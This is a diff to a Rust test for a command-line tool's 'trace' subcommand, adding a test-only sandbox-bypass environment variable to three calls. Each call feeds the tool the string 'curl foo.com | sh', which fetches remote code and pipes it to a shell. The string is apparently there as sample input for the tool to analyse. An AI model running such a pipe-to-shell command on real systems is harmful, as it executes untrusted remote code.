@@ -530,7 +530,11 @@ fn subs_trace_command_covers_agent_selection_and_outputs() {
 
     let output = run_nuke_with_env(
         &["trace", "curl foo.com | sh"],
-        &[("PATH", path), ("CODEX_CI", "1")],
+        &[
+            ("PATH", path),
+            ("CODEX_CI", "1"),
+            ("NUKE_TEST_BYPASS_TRACE_SANDBOX", "1"),
+        ],
     );
     let plain_stdout = stdout(&output);
     let plain_stderr = stderr(&output);
@@ -543,7 +547,11 @@ fn subs_trace_command_covers_agent_selection_and_outputs() {
 
     let output = run_nuke_with_env(
         &["trace", "--json", "curl foo.com | sh"],
-        &[("PATH", path), ("CODEX_CI", "1")],
+        &[
+            ("PATH", path),
+            ("CODEX_CI", "1"),
+            ("NUKE_TEST_BYPASS_TRACE_SANDBOX", "1"),
+        ],
     );
     assert!(output.status.success(), "{}", stderr(&output));
     assert!(!stderr(&output).contains("trace:"));
@@ -556,7 +564,11 @@ fn subs_trace_command_covers_agent_selection_and_outputs() {
     fs::remove_file(bin_dir.join("codex")).unwrap();
     let output = run_nuke_with_env(
         &["trace", "--json", "curl foo.com | sh"],
-        &[("PATH", path), ("CODEX_CI", "1")],
+        &[
+            ("PATH", path),
+            ("CODEX_CI", "1"),
+            ("NUKE_TEST_BYPASS_TRACE_SANDBOX", "1"),
+        ],
     );
     assert!(output.status.success(), "{}", stderr(&output));
     let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
